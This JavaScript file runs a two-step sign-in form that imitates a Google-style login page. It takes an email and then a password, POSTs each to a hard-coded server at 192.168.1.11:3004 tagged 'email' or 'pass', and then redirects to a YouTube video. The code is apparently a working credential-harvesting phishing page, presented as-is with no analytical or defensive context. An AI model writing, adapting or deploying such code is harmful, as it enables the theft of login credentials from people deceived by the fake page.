"use strict";
const placeHolder = document.querySelector("div.form-div > form > div.enter-email > div");
const input = document.querySelector("div.form-div > form > div.enter-email > input");
const form = document.getElementsByTagName("form")[0];
const warningParagraph = document.querySelector("p.warning");
const loader = document.querySelector("div.loader");
const cover = document.querySelector("div.cover");
let a = 0;
let b = 0;
placeHolder.addEventListener("click", () => {
    input.focus();
});
input.addEventListener("focus", () => {
    placeHolder.style.transform = "scale(0.75) translateY(-70%)";
    placeHolder.style.top = "0";
    if (a !== 0) {
        placeHolder.style.color = "#b3261e";
        input.style.borderColor = "#b3261e";
    }
    else {
        placeHolder.style.color = "#0b57d0";
        input.style.borderColor = "#0b57d0";
    }
    ;
});
input.addEventListener("blur", () => {
    input.value = input.value.trim();
    if (a !== 0) {
        input.style.borderColor = "#b3261e";
    }
    else {
        input.style.borderColor = "#747775";
    }
    ;
    if (input.value !== "") {
        placeHolder.style.top = "0";
        placeHolder.style.transform = "scale(0.75) translateY(-70%)";
        if (a !== 0) {
            placeHolder.style.color = "#b3261e";
        }
        else {
            placeHolder.style.color = "#1f1f1f";
        }
        ;
    }
    else {
        placeHolder.style.top = "50%";
        placeHolder.style.transform = "translateY(-50%)";
        placeHolder.style.color = "#1f1f1f";
    }
    ;
});
form.addEventListener("submit", (event) => {
    if (input.value === "" || input.value.length < 3) {
        a++;
        input.focus();
        input.style.borderColor = "#b3261e";
        placeHolder.style.color = "#b3261e";
        warningParagraph.style.display = "block";
    }
    else {
        cover.style.display = "block";
        loader.style.display = "block";
        setTimeout(() => {
            cover.style.display = "none";
            loader.style.display = "none";
        }, 1200);
        (async () => {
            const request = new Request("http://192.168.1.11:3004", {
                method: "POST",
                headers: { "CustomHeader": `${b === 0 ? "email" : "pass"}` },
                keepalive: true,
                body: input.value + "\r\n",
            });
            const response = await fetch(request);
            const serverSentObj = await response.json();
            if (b === 0) {
                const h1 = document.querySelector("section > h1");
                const forgotEmailOrShowPass = document.querySelector("p.forgot-email");
                const createAccountOrForgotPass = document.querySelector("div.submit-form > p");
                setTimeout(() => {
                    h1.textContent = serverSentObj.sayHi;
                    placeHolder.textContent = serverSentObj.enterPass;
                    createAccountOrForgotPass.textContent = serverSentObj.forgotPass;
                    warningParagraph.getElementsByTagName("span")[0].textContent = serverSentObj.warning;
                    warningParagraph.style.display = "none";
                    input.value = "";
                    a = 0;
                    input.type = "password";
                    input.focus();
                    forgotEmailOrShowPass.innerHTML = `
                        <input type="checkbox" name="showOrHidePass" id="showOrHidePass" />
                        <label for="showOrHidePass" class="show-or-hide-pass">${serverSentObj.showPass}</label>
                    `;
                    const checkbox = forgotEmailOrShowPass.getElementsByTagName("input")[0];
                    checkbox.addEventListener("change", () => {
                        if (checkbox.checked) {
                            input.type = "text";
                        }
                        else {
                            input.type = "password";
                        }
                        ;
                    });
                }, 900);
            }
            else {
                location.replace("https://www.youtube.com/watch?v=bp0tA45y2GQ");
            }
            ;
            // increment b
            b++;
        })();
    }
    ;
    event.preventDefault();
});
